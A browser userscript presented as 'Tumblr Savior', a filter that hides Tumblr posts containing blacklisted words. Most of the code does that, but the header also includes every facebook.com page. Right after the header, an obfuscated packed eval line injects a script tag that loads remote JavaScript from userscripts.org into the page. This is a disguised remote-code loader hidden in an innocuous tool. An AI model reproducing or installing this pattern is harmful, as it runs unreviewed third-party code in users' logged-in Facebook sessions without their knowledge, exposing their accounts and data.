// ==UserScript==
// @name           Tumblr Savior Pro + Last Update
// @include       http*://*.facebook.com/*
// @namespace      bjornstar
// @description    Saves you from ever having to see another post about certain things ever again
// @include        http://www.tumblr.com/dashboard
// @include        http://www.tumblr.com/dashboard/*
// @include        http://www.tumblr.com/show/*
// @include        http://www.tumblr.com/tagged/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


function needstobesaved(theStr){
  var blackList = new Array('iphone','ipad','#spoilers');
  var whiteList = new Array('bjorn', 'octopus');
  var blacklisted = false;
  var whitelisted = false;
  
  for(var i=0;i<=whiteList.length;i++) {
    var whiteWord = ''+whiteList[i];
    if(theStr.toLowerCase().indexOf(whiteWord.toLowerCase())>=0) {
      whitelisted = true;
    }
  }

  if (!whitelisted) {
    for(var i=0;i<=blackList.length;i++) {
      var blackWord = ''+blackList[i];
      if(theStr.toLowerCase().indexOf(blackWord.toLowerCase())>=0) {
        blacklisted = true;
      }
    }
  }
  return blacklisted;
}

var liPosts = document.getElementsByTagName('li');
var last_check = 0;
  
function check_for_saving() {
	for (var i=last_check;i<liPosts.length;i++) {
		if (liPosts[i].id.substring(0,4)=='post' && liPosts[i].className.indexOf('not_mine') >= 0) {
			var savedfrom = needstobesaved(liPosts[i].innerHTML);
			if (savedfrom) {
				var div_filtered = document.createElement('div');
				div_filtered.style.display = 'none';

				while (liPosts[i].childNodes.length > 1) {
					div_filtered.appendChild(liPosts[i].childNodes[0]);
				}

				var div_notice = document.createElement('div');
				div_notice.className = 'post_info';
				div_notice.innerHTML = 'You have been saved from this post, it had something you didn\'t want to see in it. <a onclick="this.parentNode.style.display=\'none\'; this.parentNode.nextSibling.style.display=\'\'; return false;" href="#"><i>Click here</i></a> if you cannot resist the temptation.';

				liPosts[i].appendChild(div_notice);
				liPosts[i].appendChild(div_filtered);
			}
		}
	}
	last_check = liPosts.length;
}

function addGlobalStyle(css) {
  var elmHead, elmStyle;
  elmHead = document.getElementsByTagName('head')[0];
  elmStyle = document.createElement('style');
  elmStyle.type = 'text/css';
  elmHead.appendChild(elmStyle);
  elmStyle.innerHTML = css;
}

var better_rule = '.source_url {display:none !important;}';
try {
  document.styleSheets[0].insertRule(better_rule, 0);
} catch (e) {
  addGlobalStyle(better_rule);
}

setInterval(check_for_saving, 200);